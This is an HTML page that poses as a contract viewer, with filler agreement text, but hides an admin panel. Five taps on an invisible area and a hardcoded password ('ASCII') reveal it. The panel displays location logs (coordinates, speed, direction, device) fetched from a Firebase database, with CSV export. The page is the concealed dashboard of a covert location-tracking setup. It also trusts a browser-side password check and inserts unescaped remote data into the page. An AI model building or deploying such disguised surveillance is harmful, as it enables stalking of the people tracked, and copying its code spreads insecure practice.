<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SmartTrust Viewer</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #f2f2f2;
      color: #333;
    }
    header {
      background: linear-gradient(to right, #0b0c2a, #1f2d50);
      color: white;
      padding: 20px;
      text-align: center;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
    }
    .content {
      padding: 30px;
      max-width: 900px;
      margin: auto;
      background: white;
      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
      margin-top: 40px;
      position: relative;
    }
    .contract-title {
      font-size: 24px;
      color: #1f2d50;
      margin-bottom: 10px;
    }
    .contract-meta {
      font-size: 14px;
      margin-bottom: 20px;
      color: #666;
    }
    .section {
      margin-bottom: 25px;
    }
    .section-title {
      font-weight: bold;
      margin-bottom: 5px;
      color: #333;
    }
    .coords {
      position: absolute;
      bottom: 10px;
      right: 20px;
      font-size: 12px;
      color: #888;
    }
    footer {
      text-align: center;
      font-size: 12px;
      color: #888;
      padding: 30px 10px;
    }
    #adminBtnArea {
      position: fixed;
      bottom: 0;
      width: 100%;
      height: 60px;
    }
    .admin-panel {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.95);
      color: white;
      padding: 30px;
      overflow-y: auto;
      z-index: 9999;
    }
    .admin-panel h2 {
      color: #00ffcc;
    }
    .admin-panel table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      font-size: 14px;
    }
    .admin-panel table, .admin-panel th, .admin-panel td {
      border: 1px solid #999;
      padding: 8px;
    }
    .btn {
      background: #00ffcc;
      color: #000;
      border: none;
      padding: 10px 15px;
      margin: 10px 5px;
      cursor: pointer;
    }
    .hidden-input {
      background: black;
      border: 1px solid #00ffcc;
      color: #00ffcc;
      padding: 10px;
      width: 100%;
      font-size: 16px;
      margin-top: 20px;
    }
  </style>
</head>
<body><header>
  <h1>SmartTrust Viewer</h1>
  <p>Last seen: 8/1/2025, 11:43:41 PM</p>
</header><div class="content">
  <div class="contract-title">SmartCheck Contract Viewer</div>
  <div class="contract-meta">
    Document: SC-024/NGX-CON<br>
    Status: Active<br>
    Issued by: National Blockchain Governance Unit<br>
    Effective Date: August 1, 2025<br>
    Parties: GlobalChain Inc. and SmartCheck Solutions<br>
    [Digital Signature Verified ‚úÖ]
  </div>  <div class="section">
    <div class="section-title">Section 1: Terms & Conditions</div>
    This Agreement outlines the rights and responsibilities of both parties.
  </div>
  <div class="section">
    <div class="section-title">Section 2: Payment Schedule</div>
    Payments will be made quarterly and subject to review.
  </div>
  <div class="section">
    <div class="section-title">Section 3: Liability Clause</div>
    Both parties agree to indemnify each other against third-party claims.
  </div>
  <div class="section">
    <div class="section-title">Section 4: Signature Authorization</div>
    This agreement becomes valid upon digital signature confirmation.
  </div>  <div class="coords">
    Lat: <span id="lat">Loading...</span>, Lng: <span id="lng">Loading...</span>
  </div>
</div><div id="adminBtnArea" onclick="handleTap()"></div><div class="admin-panel" id="adminPanel">
  <h2>Admin Panel ‚Äì Location Logs</h2>
  <input type="password" placeholder="Enter Password" class="hidden-input" id="adminPass">
  <button class="btn" onclick="checkPassword()">Enter</button>
  <div id="logArea" style="display: none;">
    <button class="btn" onclick="clearLogs()">üóë Clear Logs</button>
    <button class="btn" onclick="exportLogs()">üìÅ Export CSV</button>
    <table id="logTable">
      <thead>
        <tr><th>Time</th><th>Lat</th><th>Lng</th><th>Speed</th><th>Direction</th><th>Device</th></tr>
      </thead>
      <tbody></tbody>
    </table>
  </div>
</div><footer>
  <p>SmartTrust Technologies Ltd.<br>¬© 2025 SmartTrust. All rights reserved.</p>
</footer><script>
let tapCount = 0;
let tapTimeout;

function handleTap() {
  tapCount++;
  clearTimeout(tapTimeout);
  tapTimeout = setTimeout(() => tapCount = 0, 1500);
  if (tapCount >= 5) {
    document.getElementById('adminPanel').style.display = 'block';
  }
}

function checkPassword() {
  const pass = document.getElementById('adminPass').value;
  if (pass === 'ASCII') {
    document.getElementById('logArea').style.display = 'block';
  } else {
    alert('Wrong password');
  }
}

function clearLogs() {
  document.querySelector('#logTable tbody').innerHTML = '';
}

function exportLogs() {
  let csv = 'Time,Lat,Lng,Speed,Direction,Device\n';
  document.querySelectorAll('#logTable tbody tr').forEach(row => {
    csv += Array.from(row.cells).map(cell => cell.textContent).join(',') + '\n';
  });
  const blob = new Blob([csv], { type: 'text/csv' });
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = 'location_logs.csv';
  link.click();
}

function updateCoords() {
  fetch('https://gps-d0bab-default-rtdb.firebaseio.com/logs.json')
    .then(res => res.json())
    .then(data => {
      const keys = Object.keys(data || {}).reverse();
      const latest = data[keys[0]];
      document.getElementById('lat').textContent = latest.lat;
      document.getElementById('lng').textContent = latest.lng;

      const tbody = document.querySelector('#logTable tbody');
      tbody.innerHTML = '';
      keys.forEach(k => {
        const row = data[k];
        const tr = document.createElement('tr');
        tr.innerHTML = `<td>${row.time}</td><td>${row.lat}</td><td>${row.lng}</td><td>${row.speed}</td><td>${row.direction}</td><td>${row.device}</td>`;
        tbody.appendChild(tr);
      });
    });
}

updateCoords();
setInterval(updateCoords, 60000);
</script></body>
        </html>
